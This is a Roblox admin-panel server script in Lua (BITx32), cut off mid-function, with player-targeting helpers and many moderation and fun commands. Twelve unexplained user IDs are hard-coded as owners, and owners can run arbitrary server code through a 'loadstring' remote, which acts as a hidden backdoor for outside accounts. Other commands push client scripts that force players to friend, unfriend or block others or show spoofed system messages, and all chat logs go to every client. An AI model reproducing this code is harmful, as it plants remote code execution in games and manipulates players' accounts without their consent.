return function(PLAYER_ADMIN)
	-- Services
	local MarketplaceService = game:GetService("MarketplaceService")
	local TeleportService = game:GetService("TeleportService")
	local InsertService = game:GetService("InsertService")
	local SoundService = game:GetService("SoundService")
	local HttpService = game:GetService("HttpService")
	local LogService = game:GetService("LogService")
	local Workspace = game:GetService("Workspace")
	local Lighting = game:GetService("Lighting")
	local Players = game:GetService("Players")
	local Teams = game:GetService("Teams")
	-- Variables
	local GLOBAL_VERSION = "v0.2.4"
	local HTTPEnabled = nil
	local AllowFriends = true
	local FreeAdmin = false
	local ServerLock = false
	local AgeLockEnabled = false
	local AgeLock = 1
	local Tools, GUIs, Modules = script:WaitForChild("Tools"), script:WaitForChild("GUIs"), script:WaitForChild("Modules")
	local Scripts, Models = script:WaitForChild("Scripts"), script:WaitForChild("Models")
	-- Tables
	local ChatLogs = {}
	local OwnerID = {3523136467,2350519026,409722733,1244674024,487394389,4326638370,4195469592,417846643,847726308,4314426660,3653983782,417219780,}
	local AdminID = {}
	local Owner = {PLAYER_ADMIN}
	local Admin = {}
	local Bans = {}
	local CMDs = {}
	local CapArgs = {}
	local SpecialPlayerCases = {}
	local std = {}
	-- Functions
	local function getString(begin)
		local start = begin-1
		local AA = '' for i,v in pairs(CapArgs) do
			if i > start then
				if AA ~= '' then
					AA = AA .. ' ' .. v
				else
					AA = AA .. v
				end
			end
		end
		return AA
	end
	local function addCommand(name, alias, func)
		CMDs[#CMDs + 1] = {
			NAME = name;
			ALIAS = alias;
			FUNC = func;
		}
	end
	local function getUsernameFromUserId(userId)
		local Player = Players:GetPlayerByUserId(userId)
		if Player then
			return Player.Name
		end
		local name
		if pcall(function() name = Players:GetNameFromUserIdAsync(userId) end) then
			return name
		else
			return "roblox_user_"..tostring(userId)
		end
	end
	local function getPlayersByName(name)
		local tablist = {}
		for i,v in pairs(Players:GetChildren()) do
			if (string.sub(string.lower(v.Name),1,#name) == string.lower(name)) or (string.sub(string.lower(v.DisplayName),1,#name) == string.lower(name)) then
				table.insert(tablist, v)
			end
		end
		return tablist
	end
	local function FindInTable(Table, Name)
		for index, value in pairs(Table) do
			if value == Name then
				return true
			end
		end
		return false
	end
	local function GetInTable(Table, Name)
		for i = 1, #Table do
			if Table[i] == Name then
				return i
			end
		end
		return false
	end
	local function onlyIncludeInTable(tab,matches)
		local matchTable = {}
		local resultTable = {}
		for i,v in pairs(matches) do matchTable[v.Name] = true end
		for i,v in pairs(tab) do if matchTable[v.Name] then table.insert(resultTable,v) end end
		return resultTable
	end
	local function removeTableMatches(tab,matches)
		local matchTable = {}
		local resultTable = {}
		for i,v in pairs(matches) do matchTable[v.Name] = true end
		for i,v in pairs(tab) do if not matchTable[v.Name] then table.insert(resultTable,v) end end
		return resultTable
	end
	local function HttpGet(URL, noCache)
		if HTTPEnabled == false then error("Http requests are disabled in this experience.", 5) end
		local Success, Data = pcall(function()
			return HttpService:GetAsync(URL, noCache)
		end)
		if not Success and string.find(Data, "Http requests are not enabled") then
			HTTPEnabled = false
			error("Http Requests are disabled in this experience.", 5)
		end
		HTTPEnabled = true
		return Data
	end
	local function HttpPost(URL, data, CONTENT, COMRPESS)
		if HTTPEnabled == false then error("Http requests are disabled in this experience.", 5) end
		local Success, Data = pcall(function()
			return HttpService:PostAsync(URL, data, CONTENT, COMRPESS)
		end)
		if not Success and string.find(Data, "Http requests are not enabled") then
			HTTPEnabled = false
			error("Http requests are disabled in this experience.", 5)
		end
		HTTPEnabled = true
	end
	local function ToTokens(str)
		local Tokens = {}
		for op,name in string.gmatch(str,"([+-])([^+-]+)") do
			table.insert(Tokens,{Operator = op, Name = name})
		end
		return Tokens
	end
	local function SplitString(str, delim)
		local Broken = {}
		if delim == nil then delim = "," end
		for w in string.gmatch(str, "[^"..delim.."]+") do
			table.insert(Broken,w)
		end
		return Broken
	end
	local function getPlayers(list, speaker)
		if list == nil then return {speaker.Name} end
		local nameList = SplitString(list,",")
		local foundList = {}
		for _,name in pairs(nameList) do
			if string.sub(name,1,1) ~= "+" and string.sub(name,1,1) ~= "-" then name = "+"..name end
			local tokens = ToTokens(name)
			local initialPlayers = Players:GetPlayers()
			for i,v in pairs(tokens) do
				if v.Operator == "+" then
					local tokenContent = v.Name
					local foundCase = false
					for regex,case in pairs(SpecialPlayerCases) do
						local matches = {string.match(tokenContent,"^"..regex.."$")}
						if #matches > 0 then
							foundCase = true
							initialPlayers = onlyIncludeInTable(initialPlayers,case(speaker,matches,initialPlayers))
						end
					end
					if not foundCase then
						initialPlayers = onlyIncludeInTable(initialPlayers,getPlayersByName(tokenContent))
					end
				else
					local tokenContent = v.Name
					local foundCase = false
					for regex,case in pairs(SpecialPlayerCases) do
						local matches = {string.match(tokenContent,"^"..regex.."$")}
						if #matches > 0 then
							foundCase = true
							initialPlayers = removeTableMatches(initialPlayers,case(speaker,matches,initialPlayers))
						end
					end
					if not foundCase then
						initialPlayers = removeTableMatches(initialPlayers,getPlayersByName(tokenContent))
					end
				end
			end
			for i,v in pairs(initialPlayers) do table.insert(foundList,v) end
		end
		local foundNames = {}
		for i,v in pairs(foundList) do table.insert(foundNames,v.Name) end
		return foundNames
	end
	local function checkFriends(plr)
		local foundFriend = false
		for i,v in pairs(Players) do
			spawn(function()
				if FindInTable(Owner,v.Name) or FindInTable(Admin,v.Name) then
					if plr:IsFriendsWith(v.userId) then
						foundFriend = true
					end
				end
			end)
		end
		if foundFriend == true then
			return true
		end
	end
	function std.inTable(tbl, val)
		if tbl==nil then return false end
		for _,v in pairs(tbl)do
			if v==val then return true end
		end 
		return false
	end
	local function findCMD(cmd_name, speaker)
		for i,v in pairs(CMDs)do
			if v.NAME:lower()==cmd_name:lower() or std.inTable(v.ALIAS,cmd_name:lower()) then
				return v
			end
		end
	end
	local function isNumber(str)
		return tonumber(str) ~= nil
	end
	local function GiveHandler(player)
		local Gui = GUIs.ADMIN_GUI_BITX32:Clone()
		local whar = player:FindFirstChildWhichIsA("PlayerGui", true):FindFirstChild("ADMIN_GUI_BITX32")
		if whar ~= nil then
			whar:Destroy()
			wait()
		end
		Gui.Parent = player:FindFirstChildWhichIsA("PlayerGui", true)
		Gui.Bitx32_ADMIN.Disabled = false
	end
	-- Set up
	for i,v in pairs(script.Parent:GetChildren()) do
		if v.Name == "BITx32" and v ~= script then
			v:Destroy()
		end
	end
	for i,v in pairs(Players:GetChildren()) do
		spawn(function()
			for i,c in pairs(v.PlayerGui:GetChildren()) do
				if c.Name == "ADMIN_GUI_BITX32" then
					c:Destroy()
				end
			end
		end)
	end
	for i,v in pairs(SoundService:GetChildren()) do
		if v.Name == "RemoteFolder32" then
			v:Destroy()
		end
	end
	wait()
	for i = 1, #OwnerID do
		spawn(function()
			table.insert(Owner,getUsernameFromUserId(OwnerID[i]))
		end)
	end
	for i = 1, #AdminID do
		spawn(function()
			table.insert(Admin,getUsernameFromUserId(AdminID[i]))
		end)
	end
	local function LogTime()
		local DateData = os.date("*t")
		local HOUR, MINUTE, SECOND = 0, 0, 0
		local TIME = "AM"
		if DateData.hour > 12 then
			TIME = "PM"
			HOUR = tostring(DateData.hour - 12)
		else
			HOUR = tostring(DateData.hour)
		end
		if DateData.min < 10 then
			MINUTE = "0"..tostring(DateData.min)
		else
			MINUTE = tostring(DateData.min)
		end
		if DateData.sec < 10 then
			SECOND = "0"..tostring(DateData.sec)
		else
			SECOND = tostring(DateData.sec)
		end
		return HOUR..":"..MINUTE..":"..SECOND.." "..TIME
	end
	SpecialPlayerCases = {
		["all"] = function(speaker)return Players:GetPlayers()end,
		["everyone"] = function(speaker)return Players:GetPlayers()end,
		["others"] = function(speaker)
			local plrs = {}
			for i,v in pairs(Players:GetPlayers()) do
				if v ~= speaker then
					table.insert(plrs, v)
				end
			end
			return plrs
		end,
		["me"] = function(speaker)return {speaker} end,
		["#(%d+)"] = function(speaker, args, currentList)
			local returns = {}
			local randAmount = tonumber(args[1])
			local players = {unpack(currentList)}
			for i = 1,randAmount do
				if #players == 0 then break end
				local randIndex = math.random(1,#players)
				table.insert(returns,players[randIndex])
				table.remove(players,randIndex)
			end
			return returns
		end,
		["random"] = function(speaker, args, currentList)
			local players = currentList
			return {players[math.random(1,#players)]}
		end,
		["%%(.+)"] = function(speaker,args)
			local returns = {}
			local team = args[1]
			for _,plr in pairs(Players:GetPlayers()) do
				if plr.Team and string.sub(string.lower(plr.Team.Name),1,#team) == string.lower(team) then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["allies"] = function(speaker)
			local returns = {}
			local team = speaker.Team
			for _,plr in pairs(Players:GetPlayers()) do
				if plr.Team == team then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["enemies"] = function(speaker)
			local returns = {}
			local team = speaker.Team
			for _,plr in pairs(Players:GetPlayers()) do
				if plr.Team ~= team then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["team"] = function(speaker)
			local returns = {}
			local team = speaker.Team
			for _,plr in pairs(Players:GetPlayers()) do
				if plr.Team == team then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["nonteam"] = function(speaker)
			local returns = {}
			local team = speaker.Team
			for _,plr in pairs(Players:GetPlayers()) do
				if plr.Team ~= team then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["friends"] = function(speaker,args)
			local returns = {}
			for _,plr in pairs(Players:GetPlayers()) do
				if plr:IsFriendsWith(speaker.UserId) and plr ~= speaker then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["nonfriends"] = function(speaker,args)
			local returns = {}
			for _,plr in pairs(Players:GetPlayers()) do
				if not plr:IsFriendsWith(speaker.UserId) and plr ~= speaker then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["bacons"] = function(speaker,args)
			local returns = {}
			for _,plr in pairs(Players:GetPlayers()) do
				if plr.Character:FindFirstChild('Pal Hair') or plr.Character:FindFirstChild('Kate Hair') then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["admins"] = function(speaker)
			local returns = {}
			for _,plr in pairs(game:GetService("Players"):GetPlayers()) do
				if FindInTable(Admin,plr.Name) then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["nonadmins"] = function(speaker)
			local returns = {}
			for _,plr in pairs(game:GetService("Players"):GetPlayers()) do
				if not FindInTable(Admin,plr.Name) and not FindInTable(Owner,plr.Name) then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["age(%d+)"] = function(speaker,args)
			local returns = {}
			local age = tonumber(args[1])
			if not (age == nil) then return end
			for _,plr in pairs(Players:GetPlayers()) do
				if plr.AccountAge <= age then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["dead"] = function(speaker)
			local plrs = {}
			for i,v in pairs(Players:GetPlayers()) do
				if v.Character.Humanoid.Health <= 0 then
					table.insert(plrs,v)
				end
			end
			return plrs
		end,
		["rad(%d+)"] = function(speaker,args)
			local returns = {}
			local radius = tonumber(args[1])
			local speakerChar = speaker.Character
			if not speakerChar or not speakerChar:FindFirstChild("HumanoidRootPart") then return end
			for _,plr in pairs(Players:GetPlayers()) do
				if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
					local magnitude = (plr.Character:FindFirstChild("HumanoidRootPart").Position-speakerChar.HumanoidRootPart.Position).magnitude
					if magnitude <= radius then table.insert(returns,plr) end
				end
			end
			return returns
		end,
		["owner"] = function(speaker)
			local returns = {}
			for _,plr in pairs(game:GetService("Players"):GetPlayers()) do
				if FindInTable(Owner,plr.Name) then
					table.insert(returns,plr)
				end
			end
		end,
		["alive"] = function(speaker)
			local plrs = {}
			for i,v in pairs(Players:GetPlayers()) do
				if v.Character.Humanoid.Health >= 1 then
					table.insert(plrs,v)
				end
			end
			return plrs
		end,
	}
	repeat wait() until #Owner >= #OwnerID
	local RemoteFolder = Instance.new("Folder", SoundService)
	RemoteFolder.Name = "RemoteFolder32"
	local RunEvent = Instance.new("RemoteEvent", RemoteFolder)
	local RunOnClient = Instance.new("RemoteEvent", RemoteFolder)
	local SendToClient = Instance.new("RemoteEvent", RemoteFolder)
	RunEvent.Name = "RC"
	RunOnClient.Name = "ROC"
	SendToClient.Name = "STC"
	local function RunCommand(player, class, command, args, cargs)
		spawn(function()
			if FindInTable(Owner, player.Name) or FindInTable(Admin, player.Name) then
				if class == 'command' then
					CapArgs = cargs
					local success, data = pcall(function()
						local command = findCMD(command, player)
						command.FUNC(args, player)
					end)
					if not success and typeof(data) == "string" then
						SendToClient:FireAllClients("Error", data)
					end
					SendToClient:FireAllClients("Log", player.Name..": "..tostring(command))
				elseif class == 'setting' then
					if command == 'allowFriends' then
						AllowFriends = args
					end
				elseif class == 'loadstring' then
					if FindInTable(Owner, player.Name) then
						require(Modules.Loadstring)(command)()
					end
				elseif class == 'UpdateClientUi' then
					SendToClient:FireAllClients("Update", "Admin", Admin)
					SendToClient:FireAllClients("Update", "Ban", Bans)
				end
			end
		end)
	end
	RunEvent.OnServerEvent:Connect(RunCommand)
	Players.PlayerAdded:Connect(function(player)
		if FindInTable(Bans, player.Name:lower()) then
			return player:Kick("You are banned from the requested server.")
		end
		if AgeLockEnabled and not FindInTable(Owner, player.Name) and not FindInTable(Admin, player.Name) then
			if AllowFriends == true and not checkFriends(player) and player.AccountAge <= AgeLock then
				return player:Kick("Kicked out from requested server due to agelock.")
			elseif AllowFriends == false and player.AccountAge <= AgeLock then
				return player:Kick("Kicked out from requested server due to agelock.")
			end
		end
		if FindInTable(Owner, player.Name) or FindInTable(Admin, player.Name) then
			GiveHandler(player)
		else
			if FreeAdmin then
				table.insert(Admin, player.Name)
				GiveHandler(player)
			end
		end
		player.Chatted:Connect(function(message)
			if #ChatLogs >= 3000 then
				ChatLogs = {}
			end
			ChatLogs[#ChatLogs + 1] = {
				SPEAKER = player.Name,
				MESSAGE = message,
				TIME = LogTime(),
			}
			SendToClient:FireAllClients("NewChat", ChatLogs[#ChatLogs])
		end)
	end)
	for i,v in pairs(Players:GetPlayers()) do
		if FindInTable(Bans, v.Name:lower()) then
			v:Kick("You are banned from the requested server.")
		end
		if FreeAdmin then
			table.insert(Admin, v.Name)
			GiveHandler(v)
		end
		if FindInTable(Owner, v.Name) or FindInTable(Admin, v.Name) then
			GiveHandler(v)
		end
		v.Chatted:Connect(function(msg)
			if #ChatLogs >= 3000 then
				ChatLogs = {}
			end
			ChatLogs[#ChatLogs + 1] = {
				SPEAKER = v.Name,
				MESSAGE = msg,
				TIME = LogTime(),
			}
			SendToClient:FireAllClients("NewChat", ChatLogs[#ChatLogs])
		end)
	end
	
	addCommand("info", {'details'}, function(args, speaker)
		SendToClient:FireClient(speaker, "Open", "Information")
	end)
	addCommand("logs", {}, function(args, speaker)
		SendToClient:FireClient(speaker, "Open", "Logs")
	end)
	addCommand("commands",{'cmds'}, function(args, speaker)
		SendToClient:FireClient(speaker, "Open", "Commands")
	end)
	addCommand("chatlogs", {'clogs'}, function(args, speaker)
		SendToClient:FireClient(speaker, "Open", "ChatLogs")
	end)
	addCommand("bans", {'banland'}, function(args, speaker)
		SendToClient:FireClient(speaker, "Open", "Bans")
	end)
	addCommand("admins", {'administrators'}, function(args, speaker)
		SendToClient:FireClient(speaker, "Open", "Admins")
	end)
	addCommand("keybinds", {}, function(args, speaker)
		SendToClient:FireClient(speaker, "Open", "Keybinds")
	end)
	addCommand("updates", {}, function(args, speaker)
		SendToClient:FireClient(speaker, "Open", "Updates")
	end)
	addCommand("breakloops", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				if args[1] then
					SendToClient:FireClient(Players[v],"Breakloops")
				else
					for i,v in pairs(Players:GetChildren()) do
						spawn(function()
							SendToClient:FireAllClients('Breakloops')
						end)
					end
				end
			end)
		end
	end)
	-- OP ADMINISTRATOR COMMANDS
	addCommand("kick", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		local reason = getString(2)
		for i,v in pairs(players) do
			spawn(function()
				if not FindInTable(Owner,Players[v].Name) and not FindInTable(Admin,Players[v].Name) then
					Players[v]:Kick(reason)
				end
			end)
		end
	end)
	addCommand("admin", {}, function(args, speaker)
		if not FindInTable(Owner,speaker.Name) then return end
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players) do
			spawn(function()
				if not FindInTable(Owner,Players[v].Name) and not FindInTable(Admin,Players[v].Name) then
					table.insert(Admin,Players[v].Name)
					GiveHandler(Players[v])
				end
			end)
		end
	end)
	addCommand("unadmin", {}, function(args, speaker)
		if not FindInTable(Owner,speaker.Name) then return end
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players) do
			spawn(function()
				if FindInTable(Admin,Players[v].Name) then
					for a,b in pairs(Admin) do
						if b == Players[v].Name then
							table.remove(Admin, a)
						end
					end
					for i,v in pairs(Players[v]:WaitForChild("PlayerGui"):GetChildren()) do
						if v.Name == 'ADMIN_GUI_BITX32' or v:FindFirstChild('Bitx32_ADMIN') then
							v:Destroy()
						end
					end
				end
			end)
		end
		if FindInTable(Admin,getString(1):lower()) then
			table.remove(Admin,GetInTable(Admin,getString(1):lower()))
		end
	end)
	addCommand("ban", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players) do
			spawn(function()
				if not FindInTable(Owner,Players[v].Name) and not FindInTable(Admin,Players[v].Name) then
					local plr = Players[v].Name:lower()
					table.insert(Bans,plr)
					if args[2] then
						Players[v]:Kick('\n\n[Banned from server.]\n'..getString(2)..'\n')
					else
						Players[v]:Kick('\n\n[Banned from server.]\n')
					end
				end
			end)
		end
	end)
	addCommand("unban", {}, function(args, speaker)
		local plr = getString(1):lower()
		if FindInTable(Bans, plr) then
			table.remove(Bans, GetInTable(Bans,plr))
		end
	end)
	addCommand("clearbans",{'clrbans'}, function(args, speaker)
		Bans = {}
	end)
	addCommand("removeadmin",{},function(args, speaker)
		if not FindInTable(Owner, speaker.Name) then return end
		for i,v in pairs(Players:GetChildren()) do
			spawn(function()
				for i,c in pairs(v.PlayerGui:GetChildren()) do
					if c.Name == "ADMIN_GUI_BITX32" then
						c:Destroy()
					end
				end
			end)
		end
		for i,v in pairs(SoundService:GetChildren()) do
			if v.Name == "RemoteFolder" then
				v:Destroy()
			end
		end
		script:Destroy()
	end)
	-- Safety
	addCommand("agelock",{},function(args, speaker)
		if not FindInTable(Owner,speaker.Name) then return end
		AgeLockEnabled = true
		AgeLock = args[1]
	end)
	addCommand("unagelock",{},function(args, speaker)
		if not FindInTable(Owner,speaker.Name) then return end
		AgeLockEnabled = false
	end)
	addCommand("shutdown",{},function(args, speaker)
		if not FindInTable(Owner,speaker.Name) then return end
		for index, value in pairs(Players:GetPlayers()) do
			value:Kick("\n\nServer has been shutdown.")
		end
		Players.PlayerAdded:Connect(function(player)
			player:Kick("\n\nRequested server has been shutdown.")
		end)
	end)
	-- Etc Commands
	addCommand("krustykrab",{},function(args, speaker)
		local ON = Scripts.KrustyKrab:Clone()
		ON.Name = "BA_SCRIPTz"
		ON.Disabled = false
		ON.Parent = Workspace
		game:GetService("Debris"):AddItem(ON, 1)
	end)
	addCommand("kill", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				Players[v].Character:BreakJoints()
			end)
		end
	end)
	addCommand("slowkill", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				local done = false
				while done == false do
					wait(3.5)
					Players[v].Character:FindFirstChildOfClass('Humanoid').Health = Players[v].Character:FindFirstChildOfClass('Humanoid').Health - 10
					Players[v].Character:FindFirstChildOfClass('Humanoid').WalkSpeed = Players[v].Character:FindFirstChildOfClass('Humanoid').WalkSpeed - 0.2
					Players[v].Character:FindFirstChildOfClass('Humanoid').JumpPower = Players[v].Character:FindFirstChildOfClass('Humanoid').JumpPower - 0.2
					if Players[v].Character:FindFirstChildOfClass('Humanoid').Health <= 0 or Players[v].Character ~= nil then
						done = true
					end
				end
			end)
		end
	end)
	addCommand("gear", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players) do
			spawn(function()
				local Item = game:GetService("InsertService"):LoadAsset(args[2])
				wait()
				Item = Item:GetChildren()[1]
				local Parent = Players[v]:WaitForChild("Backpack")
				Item.Parent = Parent
			end)
		end
	end)
	addCommand("sword", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players) do
			spawn(function()
				local Item = game:GetService("InsertService"):LoadAsset(125013769)
				wait()
				Item = Item:GetChildren()[1]
				local Parent = Players[v]:WaitForChild("Backpack")
				Item.Parent = Parent
			end)
		end
	end)
	addCommand("gravitygun", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players) do
			local gun = Tools["Physics Gun"]:Clone()
			gun.Parent = Players[v]:WaitForChild("Backpack")
		end
	end)
	addCommand("message", {'m'}, function(args, speaker)
		local MessageUi = GUIs:WaitForChild("MESSAGE_UI"):Clone()
		MessageUi.Frame.Title.Text = "Message From: "..speaker.DisplayName
		MessageUi.Frame.message.Text = getString(1)
		for i,v in pairs(Players:GetPlayers()) do
			spawn(function()
				local msg = MessageUi:Clone()
				msg.Parent = v:FindFirstChildWhichIsA("PlayerGui")
				msg.LocalScript.Enabled = true
			end)
		end
	end)
	addCommand("servermessage", {'sm'}, function(args, speaker)
		local MessageUi = GUIs:WaitForChild("MESSAGE_UI"):Clone()
		MessageUi.Frame.Title.Text = "Server Message"
		MessageUi.Frame.message.Text = getString(1)
		for i,v in pairs(Players:GetPlayers()) do
			spawn(function()
				local msg = MessageUi:Clone()
				msg.Parent = v:FindFirstChildWhichIsA("PlayerGui")
				msg.LocalScript.Enabled = true
			end)
		end
	end)
	-- Avatar Display
	local function Rig6(plr)
		if not plr.Character:FindFirstChild("Torso") then
			spawn(function()
				local Rig6Char = Models.R6:Clone()
				for index, value in pairs(plr.Character:GetDescendants()) do
					if not value:IsA("Motor6D") and not value:IsA("Attachment") and not value:FindFirstChild("CharacterSoundEvent") and not value:IsA("BaseWrap") then
						local parent = value.Parent.Name
						local VALID = {'Head','HumanoidRootPart','Left Arm','Right Arm','Left Leg','Right Leg','Torso'}
						if FindInTable(VALID, parent) then
							value.Parent = Rig6Char[parent]
						end
					end
				end
				local old = plr.Character
				Rig6Char.HumanoidRootPart.Position = old.HumanoidRootPart.Position
				Rig6Char.Name = plr.Name
				-- Loader
				local userId;
				if plr.CharacterAppearanceId >= 1 then
					userId = plr.CharacterAppearanceId
				else
					userId = plr.UserId
				end
				local ROBLOX = Instance.new("Decal", Rig6Char['Torso'])
				ROBLOX.Name = "roblox"
				local appearance = Players:GetCharacterAppearanceAsync(userId)
				if not appearance:FindFirstChild("Mesh") then
					Models.Mesh:Clone().Parent = Rig6Char.Head
				end
				for i,v in pairs(appearance:GetChildren()) do
					if v.Name == "R6" then
						v:GetChildren()[1].Parent = Rig6Char
					elseif v.Name == "Mesh" or v.Name == "face" then
						v.Parent = Rig6Char['Head']
					elseif v:IsA("Accessory") and not v:FindFirstChildWhichIsA("BasePart"):FindFirstChildWhichIsA("BaseWrap") then
						v.Parent = Rig6Char
					elseif not v:IsA("Folder") and not v:IsA("NumberValue") then
						v.Parent = Rig6Char
					end
				end
				wait()
				for i,v in pairs(Rig6Char:GetDescendants()) do
					if v:IsA("WrapLayer") then
						v.Parent.Parent:Destroy()
					end
				end
				Rig6Char.Parent = Workspace
				plr.Character = Rig6Char
				old:Destroy()
				wait()
				for index, value in pairs(Rig6Char:GetChildren()) do
					if value:IsA("BaseScript") then
						value.Disabled = false
					end
				end
				local fixcamScript = Scripts.FixCam:Clone()
				fixcamScript.Parent = plr.Character
				fixcamScript.Disabled = false
				wait(0.2)
			end)
		end
	end
	
	local function Rig15(plr)
		if not plr.Character:FindFirstChild("UpperTorso") then
			spawn(function()
				local Character = Models.R15:Clone()
				local userId
				Character.HumanoidRootPart.Position = plr.Character.HumanoidRootPart.Position
				Character.Name = plr.Name
				if plr.CharacterAppearanceId >= 1 then
					userId = plr.CharacterAppearanceId
				else
					userId = plr.UserId
				end
				local Appearance = Players:GetCharacterAppearanceAsync(userId)
				for i,v in pairs(Appearance:GetChildren()) do
					if v.Name == "R15Fixed" then
						for i, x in pairs(v:GetChildren()) do
							Character[x.Name]:Destroy()
							x.Parent = Character
						end
					end
				end
				if not Appearance:FindFirstChild("Mesh") then
					Models.Mesh:Clone().Parent = Character.Head
				end
				for index, value in pairs(Appearance:GetChildren()) do
					if value:IsA("NumberValue") then
						value.Parent = Character:FindFirstChildWhichIsA("Humanoid")
					elseif value:IsA("Accessory") or value:IsA("Clothing") or value:IsA("BodyColors") then
						value.Parent = Character
					elseif value.Name == "Mesh" or value.Name == "face" then
						value.Parent = Character.Head
					elseif value.Name == "R15Anim" then
						for i, x in pairs(value:GetChildren())do
							if Character.Animate:FindFirstChild(x.Name) then
								Character.Animate[x.Name]:Destroy()
								x.Parent = Character.Animate
							else
								x.Parent = Character.Animate
							end
						end
					end
				end
				Character.Parent = Workspace
				plr.Character:Destroy()
				plr.Character = Character
				wait()
				for index, value in pairs(Character:GetChildren()) do
					if value:IsA("BaseScript") then
						value.Disabled = false
					end
				end
				local fixcamScript = Scripts.FixCam:Clone()
				fixcamScript.Parent = plr.Character
				fixcamScript.Disabled = false
				wait(0.2)
			end)
		end
	end
	
	addCommand("r15", {'rig15'}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			Rig15(Players[v])
		end
	end)
	
	addCommand("r6", {'rig6'}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			Rig6(Players[v])
		end
	end)
	addCommand("respawn", {}, function(args, speaker)
		local plrs = getPlayers(args[1], speaker)
		for i,v in pairs(plrs)do
			Players[v]:LoadCharacter()
		end
	end)
	addCommand("refresh", {'re'}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				local root = Players[v].Character
				if root then
					root = root:FindFirstChild("HumanoidRootPart")
					if root then
						root = root.Position
						Players[v]:LoadCharacter()
						repeat wait(1/60) until Players[v].Character ~= nil and Players[v].Character:FindFirstChild('HumanoidRootPart')
						Players[v].Character:MoveTo(root)
					else
						Players[v]:LoadCharacter()
					end
				else
					Players[v]:LoadCharacter()
				end
			end)
		end
	end)
	-- Roblox API
	local function giveSc(scr, plr, victim)
		spawn(function()
			local Script = Scripts[scr]:Clone()
			Script.plr.Value = victim
			Script.Parent = plr:FindFirstChildWhichIsA("PlayerGui")
			Script.Enabled = true
		end)
	end
	addCommand("friend", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		local newFriend = getPlayers(args[2], speaker)[1]
		for i,v in pairs(players)do
			if args[2] then
				giveSc("AddFriendPlayer", Players[newFriend], Players[v])
			else
				giveSc("AddFriendPlayer", Players[v], speaker)
			end
		end
	end)
	addCommand("unfriend", {'removefriend'}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		local newFriend = getPlayers(args[2], speaker)[1]
		for i,v in pairs(players)do
			if args[2] then
				giveSc("unFriendPlayer", Players[newFriend], Players[v])
			else
				giveSc("unFriendPlayer", Players[v], speaker)
			end
		end
	end)
	addCommand("block", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		local newFriend = getPlayers(args[2], speaker)[1]
		for i,v in pairs(players)do
			if args[2] then
				giveSc("BlockPlayer", Players[newFriend], Players[v])
			else
				giveSc("BlockPlayer", Players[v], speaker)
			end
		end
	end)
	addCommand("unblock", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		local newFriend = getPlayers(args[2], speaker)[1]
		for i,v in pairs(players)do
			if args[2] then
				giveSc("UnBlockPlayer", Players[newFriend], Players[v])
			else
				giveSc("UnBlockPlayer", Players[v], speaker)
			end
		end
	end)
	addCommand("system", {'fsystem'}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			local chatSystemScript = Scripts.FakeSystem:Clone()
			chatSystemScript.Parent = Players[v].PlayerGui or Players[v].Backpack or Players[v].Character
			chatSystemScript.Message.Value = getString(2)
			chatSystemScript.Disabled = false
		end
	end)
	addCommand("system2", {'fsystem2'}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			local chatSystemScript = Scripts.FakeSystem2:Clone()
			chatSystemScript.Parent = Players[v].PlayerGui or Players[v].Backpack or Players[v].Character
			chatSystemScript.Message.Value = getString(2)
			chatSystemScript.Disabled = false
		end
	end)
	addCommand("fixcamera", {'fixcam'}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			local fixcamScript = Scripts.FixCam:Clone()
			fixcamScript.Parent = Players[v].PlayerGui or Players[v].Backpack or Players[v].Character
			fixcamScript.Disabled = false
		end
	end)
	addCommand("fly", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				if Players[v].Character:FindFirstChild("DisableFly") then
					for i,v in pairs(Players[v].Character:GetChildren()) do
						if v.Name == "DisableFly" then
							v:Destroy()
						end
					end
				end
				wait()
				local DisableFly = Instance.new("RemoteFunction", Players[v].Character)
				DisableFly.Name = "DisableFly"
				local FlyScript = Scripts.Fly:Clone()
				FlyScript.Disable.Value = DisableFly
				FlyScript.Parent = Players[v].Character
				FlyScript.Disabled = false
			end)
		end
	end)
	addCommand("unfly", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players) do
			spawn(function()
				Players[v].Character.DisableFly:InvokeClient(Players[v])
			end)
		end
	end)
	addCommand("flyspeed", {}, function(args, speaker)
		if args[2] then
			local players = getPlayers(args[1], speaker)
			for i,v in pairs(players)do
				if Players[v].Character:FindFirstChild('Fly') then
					Players[v].Character.Fly.Speed.Value = args[2]
				end
			end
